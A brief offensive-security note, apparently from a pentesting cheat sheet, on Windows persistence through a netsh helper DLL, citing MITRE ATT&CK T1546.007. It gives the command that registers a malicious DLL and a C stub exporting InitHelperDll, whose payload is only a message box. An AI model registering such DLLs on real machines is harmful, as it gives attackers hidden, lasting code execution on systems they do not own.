# Netsh Helper DLL for Persistence

This command makes a malicious DLL to be executed each time the `netsh` command is run.

```powershell
netsh add helper C:\evil.dll
```

Note: The DLL file must contain the `InitHelperDll` function. When the `netsh` command is run, the code in this function will be executed. Below is the example:

```c
__declspec(dllexport) void InitHelperDll() {
    // The program in here will be executed.
    MessageBox(NULL, "HACKED", "HACKED", MB_OK);
}
```

## Resources

- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1546/007/)